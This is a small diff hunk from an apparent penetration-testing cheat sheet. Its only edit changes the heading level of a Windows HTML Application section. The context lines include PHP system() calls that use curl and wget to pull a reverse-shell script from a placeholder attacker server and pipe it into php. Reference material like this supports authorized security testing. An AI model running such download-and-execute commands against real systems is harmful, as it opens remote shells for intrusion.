@@ -368,7 +368,7 @@ system('curl http://<WEBSERVER_IP>:<WEBSERVER_PORT>/php-reverse-shell.php | php'
 system('wget -qO- http://<WEBSERVER_IP>:<WEBSERVER_PORT>/php-reverse-shell.php | php')
 ```
 
-####### [Windows] HTML Application
+###### [Windows] HTML Application
 
 Windows HTML Application script can contain JavaScript or VBScript that will be
 interpreted by the operating system.
